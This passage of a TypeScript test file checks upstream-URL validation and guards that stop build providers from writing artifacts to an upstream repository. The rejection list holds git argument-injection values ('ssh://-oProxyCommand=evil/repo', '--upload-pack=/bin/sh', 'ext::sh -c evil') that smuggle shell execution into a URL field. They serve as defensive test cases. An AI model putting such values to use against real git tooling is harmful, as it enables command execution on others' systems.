    expect(pathsOverlap(real.toUpperCase(), real)).toBe(true);
    expect(pathsOverlap(join(root, 'elsewhere'), real)).toBe(false);
    // The classic false-friend: a sibling whose name is a string prefix.
    expect(pathsOverlap(`${real}-other`, real)).toBe(false);
  });

  it('accepts and refuses upstream URLs by PARSE, not by prefix', () => {
    for (const good of [
      '/srv/atrium',
      'https://github.com/lmvdz/atrium.git',
      'HTTPS://github.com/lmvdz/atrium.git',
      'ssh://git@github.com:22/lmvdz/atrium.git',
      'git://github.com/lmvdz/atrium.git',
      'http://internal.example/atrium.git',
      'file:///srv/atrium',
      'file://127.0.0.1/srv/atrium',
    ]) {
      expect(isAcceptableUpstreamUrl(good), good).toBe(true);
    }
    for (const bad of [
      'https://',
      'ssh://-oProxyCommand=evil/repo',
      'file:///srv/atrium?x=1',
      'file:///srv/atrium#f',
      'file://',
      'git://=weird=/repo',
      '--upload-pack=/bin/sh',
      'ext::sh -c evil',
      'some/relative/repo',
      'git@github.com:lmvdz/atrium.git',
      '',
    ]) {
      expect(isAcceptableUpstreamUrl(bad), bad).toBe(false);
    }
  });
});

/* ═══════════════════════════════════════════════════════════════════════════
 * LAYER 3 — PROVIDER. The dangerous provider does not build.
 * ═══════════════════════════════════════════════════════════════════════════ */

describe('THE UPSTREAM IS NEVER WRITTEN — provider wiring (#141, red-on-revert)', () => {
  let upstream: Awaited<ReturnType<typeof makeUpstream>>;
  let seeded: ScratchRepo;
  let plain: ScratchRepo;
  let artifactDir: string;
  let artifactRepo: ArtifactRepo;
  let savedOptIn: string | undefined;

  beforeEach(async () => {
    upstream = await makeUpstream();
    seeded = await createScratchRepo(undefined, { url: upstream.dir, ref: 'main' });
    plain = await createScratchRepo();
    artifactDir = await mkdtemp(join(tmpdir(), 'atrium-artifacts-141-'));
    artifactRepo = await createArtifactRepo(artifactDir, { url: upstream.dir, ref: 'main' });
    savedOptIn = process.env.EXECUTION_ALLOW_UNSANDBOXED;
    process.env.EXECUTION_ALLOW_UNSANDBOXED = '1';
  });

  afterEach(async () => {
    if (savedOptIn === undefined) delete process.env.EXECUTION_ALLOW_UNSANDBOXED;
    else process.env.EXECUTION_ALLOW_UNSANDBOXED = savedOptIn;
    await disposeScratchRepo(seeded);
    await disposeScratchRepo(plain);
    await rm(artifactDir, { recursive: true, force: true });
    await rm(upstream.dir, { recursive: true, force: true });
  });

  /**
   * BOTH providers, because the obligation belongs to the SCRATCH REPO, not to
   * one adapter. A guard wired into `worktree` alone would leave `shim` — the
   * DEFAULT provider — building the exact configuration it forbids.
   */
  const factories: Array<[string, (repo: ScratchRepo, ar?: ArtifactRepo) => unknown]> = [
    ['shim', (repo, ar) => createDeterministicShimProvider({ repo, artifactRepo: ar })],
    [
      'worktree',
      (repo, ar) => createWorktreeCommandProvider({ repo, artifactRepo: ar, command: ['true'] }),
    ],
  ];

  for (const [kind, build] of factories) {
    it(`the ${kind} provider refuses an upstream-seeded repo with NO durable artifact remote`, () => {
      // Without a durable remote the artifact's `remote` falls back to the
      // scratch repo, which teardown deletes — a real-repo receipt naming a
      // remote nobody can fetch from. REVERT-REDS: remove
      // `assertArtifactRemoteIsNotUpstream` from this factory and it builds.
      let message = '';
      try {
        build(seeded, undefined);
        expect.unreachable(`${kind} must refuse a seeded repo with no artifact remote`);
      } catch (error) {
        message = (error as Error).message;
      }
      expectExactlyGuard(message, 'provider/artifact-remote');
    });

    it(`the ${kind} provider refuses a durable artifact remote that IS the upstream`, () => {
      let message = '';
      try {
        build(seeded, { dir: upstream.dir, upstreamPath: upstream.dir });
        expect.unreachable(`${kind} must refuse an artifact remote at the upstream`);
      } catch (error) {
        message = (error as Error).message;
      }
      expectExactlyGuard(message, 'provider/artifact-remote');
    });

    it(`the ${kind} provider sees the upstream through a loopback file:// spelling`, () => {
      // The provider layer resolves the seed's URL itself, so the null-swallow
      // (#141 r2 FIX 2) disabled this guard too. REVERT-REDS: restore the
      // `catch { return null }` and this provider BUILDS with its artifact
      // remote sitting on the upstream.
      const spelled: ScratchRepo = {
        ...seeded,
        upstream: { url: `file://127.0.0.1${upstream.dir}`, ref: 'main', commit: upstream.commit },
      };
      let message = '';
      try {
        build(spelled, { dir: upstream.dir, upstreamPath: upstream.dir });
        expect.unreachable(`${kind} must refuse a loopback-spelled upstream`);
      } catch (error) {
        message = (error as Error).message;
      }
      expectExactlyGuard(message, 'provider/artifact-remote');
    });

    it(`the ${kind} provider builds normally with a distinct durable remote`, () => {
      expect(() => build(seeded, artifactRepo)).not.toThrow();
    });

    it(`the ${kind} provider is UNCHANGED for an unseeded repo with no artifact remote`, () => {
      // The flip: no upstream, no obligation. #120's behaviour is untouched.
      expect(() => build(plain, undefined)).not.toThrow();
    });
  }
});
